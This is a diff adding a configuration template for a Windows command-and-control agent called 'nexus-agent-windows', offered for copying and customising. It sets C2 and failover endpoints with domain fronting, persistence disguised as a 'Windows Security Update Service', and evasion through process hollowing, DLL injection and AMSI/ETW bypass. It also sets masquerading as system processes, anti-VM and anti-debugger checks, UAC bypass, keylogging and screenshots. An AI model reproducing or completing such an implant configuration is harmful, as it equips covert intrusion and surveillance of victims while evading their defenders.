@@ -1,0 +1,270 @@
+# Windows Agent Configuration Template
+# Copy this file to agent-windows.toml and customize for your Windows deployments
+# This file contains Windows-specific agent configurations
+
+[agent]
+# Agent identification
+name = "nexus-agent-windows"
+version = "0.1.0"
+platform = "windows"
+
+# Communication settings
+[communication]
+# Primary C2 server endpoints
+primary_endpoints = [
+    "https://c2.your-domain.com:443",
+    "https://api.your-domain.com:443"
+]
+
+# Backup endpoints for failover
+backup_endpoints = [
+    "https://backup.your-domain.com:443",
+    "https://cdn.your-domain.com:443"
+]
+
+# Connection settings
+heartbeat_interval = 30
+connection_timeout = 10
+max_retries = 5
+retry_backoff = 2
+domain_fronting = true
+
+# TLS/Certificate configuration
+[communication.tls]
+enabled = true
+client_cert_path = "./certs/client.crt"
+client_key_path = "./certs/client.key" 
+ca_cert_path = "./certs/ca.crt"
+verify_server_cert = true
+
+# User agent rotation for HTTP fallback
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
+]
+
+[persistence]
+# Windows-specific persistence mechanisms
+enabled = true
+methods = ["service", "registry", "startup", "wmi", "scheduled_task"]
+service_name = "WindowsSecurityUpdateService"
+service_display_name = "Windows Security Update Service"
+service_description = "Provides automatic security updates for Windows components"
+registry_value_name = "SecurityUpdateChecker"
+startup_filename = "SecurityUpdater.lnk"
+task_name = "\\Microsoft\\Windows\\SystemMaintenance\\SecurityUpdateCheck"
+
+[evasion]
+# Windows-specific evasion techniques
+enabled = true
+techniques = ["process_hollowing", "dll_injection", "reflective_loading", "amsi_bypass", "etw_bypass"]
+process_masquerading = true
+dll_injection_enabled = true
+amsi_bypass_enabled = true
+etw_bypass_enabled = true
+memory_protection = true
+anti_debug = true
+
+fake_process_names = [
+    "svchost.exe",
+    "explorer.exe",
+    "winlogon.exe",
+    "lsass.exe",
+    "services.exe",
+    "dwm.exe",
+    "RuntimeBroker.exe"
+]
+
+target_processes = [
+    "notepad.exe",
+    "explorer.exe",
+    "iexplore.exe",
+    "chrome.exe"
+]
+
+[execution]
+# Execution capabilities
+shell_command = true
+powershell = true
+shellcode_injection = true
+dll_loading = true
+pe_execution = true
+wmi_execution = true
+bof_execution = true
+default_shell = "cmd.exe"
+clean_environment = false
+
+alternative_shells = ["powershell.exe", "pwsh.exe"]
+preserve_vars = ["USERPROFILE", "USERNAME", "COMPUTERNAME", "PROCESSOR_ARCHITECTURE"]
+additional_paths = ["C:\\Windows\\System32", "C:\\Windows\\SysWOW64"]
+
+# PowerShell settings
+powershell_execution_policy_bypass = true
+powershell_amsi_bypass = true
+powershell_logging_bypass = true
+powershell_preferred_version = "5.1"
+powershell_fallback_versions = ["7.0", "2.0"]
+
+# Privilege escalation
+privilege_escalation_enabled = true
+privilege_escalation_techniques = ["uac_bypass", "token_manipulation", "service_abuse", "dll_hijacking"]
+auto_elevate = false
+
+[system_info]
+# System information collection
+collect_on_startup = true
+update_interval = 300  # 5 minutes
+hardware = true
+network = true
+processes = true
+users = true
+services = true
+registry = true
+environment = true
+security_tools = true
+installed_software = true
+
+# WMI classes to query
+wmi_classes = [
+    "Win32_ComputerSystem",
+    "Win32_OperatingSystem",
+    "Win32_Processor",
+    "Win32_PhysicalMemory",
+    "Win32_LogicalDisk",
+    "Win32_NetworkAdapter",
+    "Win32_Process",
+    "Win32_Service"
+]
+
+# Registry keys to collect
+registry_keys = [
+    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+    "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services"
+]
+
+[security]
+# Security and anti-analysis features
+anti_debug = true
+anti_vm = true
+anti_sandbox = true
+string_encryption = true
+vm_detection_enabled = true
+sandbox_detection_enabled = true
+analysis_detection_enabled = true
+
+vm_indicators = [
+    "VMware",
+    "VirtualBox",
+    "QEMU",
+    "Hyper-V",
+    "Parallels",
+    "Xen"
+]
+
+debugger_processes = [
+    "ollydbg.exe",
+    "windbg.exe",
+    "x64dbg.exe",
+    "ida.exe",
+    "ida64.exe",
+    "ghidra.exe"
+]
+
+monitoring_tools = [
+    "procmon.exe",
+    "procexp.exe",
+    "wireshark.exe",
+    "fiddler.exe"
+]
+
+# String obfuscation settings
+encryption_key = ""  # Auto-generated if empty
+obfuscate_domains = true
+obfuscate_file_paths = true
+obfuscate_registry_keys = true
+
+[logging]
+# Logging configuration
+enabled = true
+level = "info"
+file_path = "%TEMP%\\.system-logs"
+max_file_size = "10MB"
+max_files = 5
+event_log_integration = false
+sensitive_data_masking = true
+
+exclude_patterns = [
+    "heartbeat",
+    "routine_check"
+]
+
+[capabilities]
+# Agent capabilities
+supported_architectures = ["x86", "x64", "arm64"]
+supported_versions = [
+    "Windows 7", 
+    "Windows 8", 
+    "Windows 8.1", 
+    "Windows 10", 
+    "Windows 11", 
+    "Windows Server 2008", 
+    "Windows Server 2012", 
+    "Windows Server 2016", 
+    "Windows Server 2019", 
+    "Windows Server 2022"
+]
+
+# Feature flags
+fiber_execution = true
+bof_loading = true
+dll_injection = true
+pe_loading = true
+powershell_execution = true
+wmi_execution = true
+keylogging = true
+screenshot = true
+file_operations = true
+registry_operations = true
+
+# Windows-specific capabilities
+service_manipulation = true
+wmi_persistence = true
+scheduled_task_manipulation = true
+token_manipulation = true
+process_injection = true
+reflective_dll_loading = true
+amsi_bypass = true
+etw_bypass = true
+uac_bypass = true
+
+[performance]
+# Performance tuning
+max_memory_usage = "100MB"
+cpu_limit_percent = 15
+disk_io_limit = "2MB/s"
+network_bandwidth_limit = "200KB/s"
+max_threads = 6
+worker_thread_pool = 3
+io_thread_pool = 3
+completion_port_threads = 2
+process_priority = "Normal"
+thread_priority = "Normal"
+memory_working_set_limit = "50MB"
+handle_limit = 1000
+
+[development]
+# Development and testing options
+debug_mode = false
+verbose_logging = false
+enable_profiling = false
+crash_reporting = true
+telemetry = false
+local_server = "https://127.0.0.1:8443"
+test_mode = false
+skip_tls_verification = false
+enable_console_output = false
+enable_debug_console = false
+create_debug_file = false
+bypass_uac_for_testing = false
